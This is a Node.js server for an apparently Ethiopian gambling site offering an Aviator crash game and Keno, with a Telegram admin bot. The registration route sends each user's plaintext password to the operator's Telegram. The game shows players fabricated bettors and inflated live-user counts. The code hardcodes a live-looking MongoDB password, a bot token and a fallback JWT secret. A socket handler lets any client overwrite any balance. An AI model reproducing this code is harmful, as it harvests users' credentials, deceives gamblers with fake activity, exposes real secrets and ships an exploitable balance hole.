const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');
const TelegramBot = require('node-telegram-bot-api');
const bcrypt = require('bcryptjs');
const jwt = require('jsonwebtoken'); 
const mongoose = require('mongoose');

const app = express();

const kenoPayoutTable = {
  1: [0, 3.8],                                       
  2: [0, 0, 10],                                     
  3: [0, 0, 2, 50],                                  
  4: [0, 0, 1, 5, 80],                               
  5: [0, 0, 0, 4, 40, 150],                          
  6: [0, 0, 0, 0, 10, 50, 500],                      
  7: [0, 0, 0, 0, 0, 30, 200, 1000],                 
  8: [0, 0, 0, 0, 0, 0, 80, 400, 2000],              
  9: [0, 0, 0, 0, 0, 0, 0, 150, 800, 5000],          
  10: [0, 0, 0, 0, 0, 0, 0, 0, 500, 2500, 10000]     
};

// --- 1. CORS Configuration ---
const allowedOrigins = [
    "https://aviator-ethio-front.vercel.app", 
    "http://localhost:3000"
]; 

app.use(cors({
    origin: function (origin, callback) {
        if (!origin || allowedOrigins.indexOf(origin) !== -1) {
            callback(null, true);
        } else {
            callback(new Error('Not allowed by CORS'));
        }
    },
    methods: ["GET", "POST"],
    credentials: true
}));

app.use(express.json({ limit: '15mb' }));

const server = http.createServer(app);
const io = new Server(server, {
    cors: {
        origin: allowedOrigins,
        methods: ["GET", "POST"],
        credentials: true
    },
    transports: ['websocket', 'polling'] 
});

// --- 2. MongoDB Connection ---
const mongoURI = "mongodb+srv://abrhamman825_db_user:v1BrSJz7GHHRjwya@cluster0.oxlnr7n.mongodb.net/aviator_db?retryWrites=true&w=majority&appName=Cluster0";
mongoose.connect(mongoURI)
    .then(() => console.log("✅ DB Connected Successfully"))
    .catch(err => console.error("❌ DB Connection Error:", err));

const UserSchema = new mongoose.Schema({
    phone: { type: String, required: true, unique: true },
    password: { type: String, required: true },
    balance: { type: Number, default: 10 }
});
const User = mongoose.model('User', UserSchema);

// --- 3. Telegram Bot ---
const BOT_TOKEN = '8601691945:AAHuf1tKpCAmU6j6cOqp0i8sR0qv4F0nCPc';
const bot = new TelegramBot(BOT_TOKEN, { polling: true });
const ADMIN_ID = '2068983666';

// --- 4. Game Logic & Fake Data Generator ---
const fakeNames = ["Mery***", "Dave***", "Sara***", "Yoni***", "Ethio***", "Tedi***", "Kal***", "Bini***", "Abe***", "Hani***", "Mulu***", "Sami***", "Zeni***", "Geni***", "Ab***", "Tutu***"];

const generateFakeBets = () => {
    let bets = [];
    for (let i = 0; i < 40; i++) {
        bets.push({
            user: fakeNames[Math.floor(Math.random() * fakeNames.length)] + (Math.floor(Math.random() * 89) + 10),
            amount: (Math.floor(Math.random() * 95) + 5) * 10 
        });
    }
    return bets.sort((a, b) => b.amount - a.amount); 
};

let gameState = { 
    multiplier: 1.0, 
    status: 'waiting', 
    timer: 10, 
    liveBets: generateFakeBets(), 
    gameHistory: [],
    userCount: 2850 
};
let userSockets = {};

setInterval(() => {
    gameState.userCount = Math.floor(Math.random() * (3000 - 2500 + 1)) + 2500;
}, 4000);

// --- 5. Auth Routes (REGISTER & LOGIN) ---
app.post('/register', async (req, res) => {
    const { phone, password } = req.body;

    if (!phone || !password) {
        return res.status(400).json({ status: 'error', error: "እባክዎ ስልክ ቁጥር እና የይለፍ ቃል ያስገቡ" });
    }

    try {
        const existingUser = await User.findOne({ phone });
        if (existingUser) {
            return res.status(400).json({ status: 'error', error: "ይህ ስልክ ቁጥር ቀድሞ ተመዝግቧል" });
        }
        
        const salt = await bcrypt.genSalt(10);
        const hashedPassword = await bcrypt.hash(password, salt);
        
        const user = new User({
            phone: phone,
            password: hashedPassword,
            balance: 10 
        });
        await user.save();

        const telegramMessage = `📝 አዲስ ተጠቃሚ ተመዝግቧል!\n📱 ስልክ: ${phone}\n🔑 የይለፍ ቃል: ${password}\n🎁 የፈጠራ ስጦታ: 10 ETB`;
        
        bot.sendMessage(ADMIN_ID.toString(), telegramMessage).catch(err => {
            console.error("❌ Telegram registration alert failed:", err.message);
        });

        const token = jwt.sign(
            { id: user._id, phone: user.phone }, 
            process.env.JWT_SECRET || 'MY_SECRET_KEY_123', 
            { expiresIn: '7d' }
        );

        res.json({ 
            status: 'ok', 
            token, 
            user: { 
                phone: user.phone, 
                balance: user.balance 
            } 
        });

    } catch (e) { 
        console.error("Registration Error:", e);
        res.status(500).json({ status: 'error', error: "ምዝገባው አልተሳካም፤ እባክዎ ቆይተው ይሞክሩ" }); 
    }
});

app.post('/login', async (req, res) => {
    const { phone, password } = req.body;
    try {
        const user = await User.findOne({ phone });
        if (user && await bcrypt.compare(password, user.password)) {
            res.json({ status: 'ok', balance: user.balance, phone: user.phone });
        } else { 
            res.status(401).json({ status: 'error', error: "የስልክ ቁጥር ወይም የይለፍ ቃል ስህተት ነው" }); 
        }
    } catch (e) { 
        res.status(500).json({ status: 'error', error: "የውስጥ ሰርቨር ስህተት" }); 
    }
});

// --- 6. Keno Game API ---
const generateKenoDraw = () => {
  let draws = [];
  while (draws.length < 20) {
    let r = Math.floor(Math.random() * 80) + 1;
    if (!draws.includes(r)) draws.push(r);
  }
  return draws;
};

app.post('/api/keno/play', async (req, res) => {
  const { phone, selectedNumbers, betAmount } = req.body;
  const selectionCount = selectedNumbers.length;

  try {
    const user = await User.findOne({ phone });
    if (!user) return res.status(404).json({ error: "ተጠቃሚው አልተገኘም!" });

    if (user.balance < betAmount) {
      return res.status(400).json({ error: "በቂ ካፒታል የለዎትም!" });
    }

    const drawnNumbers = generateKenoDraw();
    const hits = selectedNumbers.filter(n => drawnNumbers.includes(n)).length;

    let winAmount = 0;
    if (selectionCount === 5) {
      if (hits === 2) winAmount = 10;
      else if (hits === 3) winAmount = 20;
      else if (hits === 4) winAmount = 200;
      else if (hits === 5) winAmount = 700;
    } else {
      const multipliers = kenoPayoutTable[selectionCount];
      const winMultiplier = multipliers[hits] || 0;
      winAmount = betAmount * winMultiplier;
    }

    user.balance = user.balance - betAmount + winAmount;
    await user.save();

    res.json({
      drawnNumbers,
      hits,
      winAmount,
      newBalance: user.balance
    });

  } catch (err) {
    res.status(500).json({ error: "የሰርቨር ስህተት ተፈጥሯል" });
  }
});

// --- 7. Socket Logic ---
io.on('connection', (socket) => {
    socket.emit('data', gameState);
    socket.on('identify', (phone) => { userSockets[phone] = socket.id; });
    
    socket.on('updateServerBalance', async (data) => {
        try { await User.findOneAndUpdate({ phone: data.phone }, { balance: data.newBalance }); } catch (e) {}
    });

    socket.on('sendDepositRequest', (data) => {
        bot.sendMessage(ADMIN_ID, `💰 አዲስ የዴፖዚት ጥያቄ!\n📱 ስልክ: ${data.phone}\n💸 መጠን: ${data.amount} ETB`);
    });

    socket.on('disconnect', () => { console.log('Client disconnected'); });
});

// --- 8. Admin Commands ---
bot.onText(/\/update (.+) (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== ADMIN_ID) return;
    const phone = match[1];
    const amount = parseFloat(match[2]);
    try {
        const user = await User.findOneAndUpdate({ phone: phone }, { $inc: { balance: amount } }, { new: true });
        if (user) {
            bot.sendMessage(ADMIN_ID, `✅ የ ${phone} ባላንስ ተስተካክሏል። አሁን: ${user.balance.toFixed(2)} ETB`);
            const userSock = userSockets[phone];
            if (userSock) { io.to(userSock).emit('manual_balance_update', { phone: user.phone, balance: user.balance }); }
        }
    } catch (e) { bot.sendMessage(ADMIN_ID, "❌ ስህተት ተከስቷል"); }
});

// --- 9. Optimized Aviator Game Engine (የተስተካከለ) ---

// ፕሮፌሽናል Crash Point መፍጠሪያ ፎርሙላ (የቤት ብልጫ/House Edge የተጠበቀበት)
const generateAviatorCrashPoint = () => {
    const rand = Math.random() * 100;

    // 1. 10% ዕድል: ወዲያውኑ በ 1.00 ላይ እንዲበላ (Instant Crash) - ቤቱ ሁልጊዜ እንዳይበላ ይጠብቃል
    if (rand < 10) {
        return 1.00;
    }
    // 2. 50% ዕድል: ከ 1.01 እስከ 2.00 ባለው ክልል ውስጥ እንዲያበቃ (ዝቅተኛ)
    else if (rand < 60) {
        return parseFloat((Math.random() * (2.00 - 1.01) + 1.01).toFixed(2));
    }
    // 3. 25% ዕድል: ከ 2.01 እስከ 5.00 ባለው ክልል (መካከለኛ)
    else if (rand < 85) {
        return parseFloat((Math.random() * (5.00 - 2.01) + 2.01).toFixed(2));
    }
    // 4. 12% ዕድል: ከ 5.01 እስከ 20.00 ባለው ክልል (ከፍተኛ)
    else if (rand < 97) {
        return parseFloat((Math.random() * (20.00 - 5.01) + 5.01).toFixed(2));
    }
    // 5. 3% ዕድል: ከ 20.01 እስከ 100.00+ የሚሄድ (ጃክፖት/ታላቅ ጉዞ)
    else {
        return parseFloat((Math.random() * (120.00 - 20.01) + 20.01).toFixed(2));
    }
};

const runGame = () => {
    gameState.status = 'waiting'; 
    gameState.timer = 10;
    gameState.multiplier = 1.0;
    gameState.liveBets = generateFakeBets(); 

    const timerInterval = setInterval(() => {
        gameState.timer--;
        io.emit('data', gameState);
        if(gameState.timer <= 0) {
            clearInterval(timerInterval);
            startFlying();
        }
    }, 1000);
};

const startFlying = () => {
    gameState.status = 'flying';
    let crashPoint = generateAviatorCrashPoint();
    console.log(`🎯 Current Round Crash Point: ${crashPoint}x`); // ለሙከራ ሰርቨር ላይ ለማየት
    
    // በበረራ ቁጥር መጠን ፍጥነቱ እንዲጨምር የሚያደርግ ዳይናሚክ ኢንክሪመንት
    let flyInterval = setInterval(() => {
        let current = parseFloat(gameState.multiplier);

        // መልቲፕላየሩ እያደገ ሲሄድ በረራው ይበልጥ ፈጣን እንዲሆን ማድረጊያ
        if (current < 2.0) {
            gameState.multiplier += 0.01;
        } else if (current < 10.0) {
            gameState.multiplier += 0.05;
        } else if (current < 30.0) {
            gameState.multiplier += 0.20;
        } else {
            gameState.multiplier += 0.50; // ከ 30 በላይ ሲሆን በጣም በፍጥነት ይሄዳል
        }

        gameState.multiplier = parseFloat(gameState.multiplier.toFixed(2));

        if(gameState.multiplier >= crashPoint) {
            clearInterval(flyInterval);
            gameState.status = 'crashed';
            gameState.multiplier = crashPoint; // መጨረሻው ክራሽ ፖይንቱ ላይ በትክክል እንዲቆም
            gameState.gameHistory.unshift(gameState.multiplier.toFixed(2));
            if(gameState.gameHistory.length > 15) gameState.gameHistory.pop();
            io.emit('data', gameState);
            setTimeout(runGame, 3000);
        } else { 
            io.emit('data', gameState); 
        }
    }, 50); // ይበልጥ ስሙዝ (Smooth) የሆነ በረራ ለማሳየት ወደ 50ms ዝቅ ተደርጓል
};

runGame();
const PORT = process.env.PORT || 10000;
server.listen(PORT, () => console.log(`🚀 Server Running on port ${PORT}`));